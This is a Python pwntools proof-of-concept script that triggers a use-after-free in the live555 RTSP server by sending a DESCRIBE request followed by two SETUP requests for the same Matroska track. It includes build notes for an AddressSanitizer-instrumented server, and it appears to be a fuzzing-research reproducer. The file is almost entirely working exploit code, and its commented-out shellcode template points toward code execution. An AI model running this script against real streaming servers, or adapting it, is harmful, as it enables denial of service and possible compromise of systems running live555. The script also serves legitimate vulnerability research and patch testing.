#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 8554
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 8554)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
# Compile live555
make C_COMPILER=clang-10 CPLUSPLUS_COMPILER=clang++-10 \
CFLAGS="-g -fsanitize=fuzzer-no-link -fsanitize=address" \
CXXFLAGS="-g -fsanitize=fuzzer-no-link -fsanitize=address" \
LINK="clang++-10 -fsanitize=fuzzer-no-link -fsanitize=address -o " all

# move to the folder keeping the RTSP server and client
cd testProgs

# copy sample media source files to the server folder
cp /path/to/SGFuzz/example/live555/sample_media_sources/*.* .

# run the RTSP server on port 8554
./testOnDemandRTSPServer 8554

# run this exp
python3 exp-live555-uaf.py DEBUG

# to debug
# b MatroskaFileServerDemux::newDemuxedTrack

# more related information
# http://lists.live555.com/pipermail/live-devel/2021-August/021959.html
"""
io = start()

describe="""DESCRIBE rtsp://127.0.0.1:8554/matroskaFileTest RTSP/1.0\r
CSeq: 2\r
User-Agent: ./testRTSPClient (LIVE555 Streaming Media v2018.08.28)\r
Accept: application/sdp\r
\r
""".encode('utf-8')
io.send(describe)
print(io.recv(1024).decode('utf-8'))

setup0="""SETUP rtsp://127.0.0.1:8554/matroskaFileTest/track1 RTSP/1.0\r
CSeq: 3\r
User-Agent: ./testRTSPClient (LIVE555 Streaming Media v2018.08.28)\r
Transport: RTP/AVP;unicast;client_port=37216-37217\r
\r
""".encode('utf-8')
io.send(setup0)
response_with_session=io.recv(1024).decode('utf-8')
print(response_with_session)

# get runtime session
session = None
for line in response_with_session.split('\r\n'):
    # b'Session: A6D9CDA9;timeout=65\r\n'
    if line.startswith('Session'):
        session = line.split(' ')[1].split(';')[0]
print('runtime session:', session)
setup1="""SETUP rtsp://127.0.0.1:8554/matroskaFileTest/track1 RTSP/1.0\r
CSeq: 3\r
User-Agent: ./testRTSPClient (LIVE555 Streaming Media v2018.08.28)\r
Transport: RTP/AVP;unicast;client_port=49022-49023\r
Session: {}\r
\r
""".format(session).encode('utf-8')
io.send(setup1)
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

